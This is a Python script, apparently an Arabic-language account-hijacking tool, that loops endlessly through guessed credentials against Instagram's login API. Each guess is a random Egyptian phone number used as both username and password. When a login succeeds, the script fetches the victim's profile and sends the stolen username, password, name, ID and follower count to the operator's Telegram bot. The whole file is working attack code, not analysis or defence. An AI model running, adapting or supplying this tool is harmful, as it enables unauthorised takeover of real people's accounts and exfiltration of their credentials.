import requests
import random
import pyfiglet
import time
import sys
from secrets import token_hex
import secrets
from uuid import uuid4
uid = uuid4()
#--------------------
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ا
#--------------------
logo = (B+'''
███████████████████████████
███████▀▀▀░░░░░░░▀▀▀███████
████▀░░░░ᏢᎪͲͲᎥΝՏΌΝ░░░░░░▀███
███│░░░░░░░@IlIlI_x░░░░░░  ░│██
██▌│░░░░░░░░░░░░░░░░░░░│▐██
██░└┐░░░░░░░░░░░░░░░░░┌┘░██
██░░└┐░░░░░░░░░░░░░░░┌┘░░██
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
██▌░│██████▌░░░▐██████│░▐██
███░│▐███▀▀░░▄░░▀▀███▌│░███
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
████▄─┘██▌░░░░░░░▐██└─▄████
█████░░▐█─┬┬┬┬┬┬┬─█▌░░████
████░░░▀┬┼┼┼┼┼┼┼┬▀░░░█████
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄████
███████▄░░░░░░░░░░░▄███████
██████████▄▄▄▄▄▄▄██████████
███████████████████████████''')
print(logo)
print(C+'༟'*55)

ID = input (B+' ~  I D : ')

token = input (C+' ~  T O K E N : ')

rogin = input (B+' - ادخل الشركه اللي تريد تسحب منها : 010 - 011 -012 -')

r = requests.Session()

user = '1234567890'
while True:
	us = str("".join(random.choice(user)for i in range(8)))
	username = '+2' + rogin + us
	password =  rogin + us
	cookies = token_hex(8) * 2
	url='https://i.instagram.com/api/v1/accounts/login/'
	headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
              'Host':'i.instagram.com'}
	data = {'uuid':uid,  'password':password,
              'username':username,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
	req_login = r.post(url,headers=headers, data=data)
	if 'logged_in_user' in req_login.json():
		userQ= req_login.json()['logged_in_user']['username']
		url_id = f'https://www.instagram.com/{userQ}/?__a=1'
		cookie = secrets.token_hex(8)*2
		head = {
            'HOST': "www.instagram.com",
            'KeepAlive' : 'True',
            'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
            'Cookie': cookie,
            'Accept' : "*/*",
            'ContentType' : "application/x-www-form-urlencoded",
            "X-Requested-With" : "XMLHttpRequest",
            "X-IG-App-ID": "936619743392459",
            "X-Instagram-AJAX" : "missing",
            "X-CSRFToken" : "missing",
            "Accept-Language" : "en-US,en;q=0.9"
		}
		req_id= requests.get(url_id,headers=head).json()
		name    = str(req_id['graphql']['user']['full_name'])
		id    = str(req_id['graphql']['user']['id'])
		followes    = str(req_id['graphql']['user']['edge_followed_by']['count'])
		following    = str(req_id['graphql']['user']['edge_follow']['count'])
		re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
		ree = re.json()
		dat = ree['data']
		tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=
		جبتلك اكونت طازه 
\n𓆝 𓆟 𓆞𓆝 𓆟 𓆞\n
U S E R : {username}\n
P A S S : {password}\n
N A M E : {name}
D A T E  : {dat}
I D  : {id}
FOLLOWERS  : {followes}
\n𓆝 𓆟 𓆞𓆝 𓆟 𓆞𓆝 \n
BY  : @IlIlI_x''')
		i = requests.post(tlg)
		print( F+'User : '+username+'Pass : '+password + '- DONE')
	if '"message":"challenge_required"' in req_login.text:
	    print(B+'User : '+username+'- Pass : '+password + '- SCURE')
	else:
			print(    Z+username+':'+password + ' - UNAVAILABLE ')
